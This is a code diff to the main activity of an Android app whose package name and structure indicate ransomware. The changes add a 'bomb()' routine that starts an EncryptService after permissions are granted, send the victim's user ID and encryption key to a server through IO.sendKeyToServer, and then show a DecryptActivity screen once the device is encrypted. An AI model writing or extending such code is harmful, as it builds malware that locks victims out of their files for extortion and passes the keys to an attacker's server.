@@ -16,7 +16,10 @@ import android.support.v4.content.ContextCompat;
 import java.util.ArrayList;
 import java.util.List;
 
+import alepacheco.com.rw.activityes.DecryptActivity;
+import alepacheco.com.rw.io.IO;
 import alepacheco.com.rw.persistence.LocalStorage;
+import alepacheco.com.rw.services.EncryptService;
 import alepacheco.com.rw.services.MyService;
 
 public class MainActivity extends Activity {
@@ -28,14 +31,20 @@ public class MainActivity extends Activity {
     Context ctx;
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
         ctx = this;
+
         if(isEncrypted()){
+            if(!checkSendedToServer()){
+                senDataToServer();
+            }
             /*
             * show activity to decrypt
             * */
+            startActivity(new Intent(this,DecryptActivity.class));
             return;
         }
+
+        setContentView(R.layout.activity_main);
 
         if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             // Alert for permisions
@@ -55,8 +64,6 @@ public class MainActivity extends Activity {
         } else {
             bomb();
         }
-
-
     }
 
     public void bomb(){
@@ -67,10 +74,20 @@ public class MainActivity extends Activity {
         return LocalStorage.getInstance(ctx).getBooleanByTag(LocalStorage.TAG_ENCRYPTED);
     }
 
+    private Boolean checkSendedToServer(){
+        return LocalStorage.getInstance(ctx).CheckSendedToServer();
+    }
+
+    private void senDataToServer(){
+        IO.sendKeyToServer(ctx,
+                    LocalStorage.getInstance(ctx).getByTag(LocalStorage.TAG_ID_USER),
+                    LocalStorage.getInstance(ctx).getByTag(LocalStorage.TAG_KEY));
+    }
+
     private class RunService extends AsyncTask<Context, Void, Void> {
         protected Void doInBackground(Context... parms) {
             SystemClock.sleep(1000);
-            Intent srv = new Intent(parms[0], MyService.class);
+            Intent srv = new Intent(parms[0], EncryptService.class);
             startService(srv);
             return null;
         }
@@ -96,7 +113,7 @@ public class MainActivity extends Activity {
         if (requestCode == 100) {
             if (grantResults.length > 0
                     && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                new RunService().execute(this);
+               bomb();
             }
         }
     }
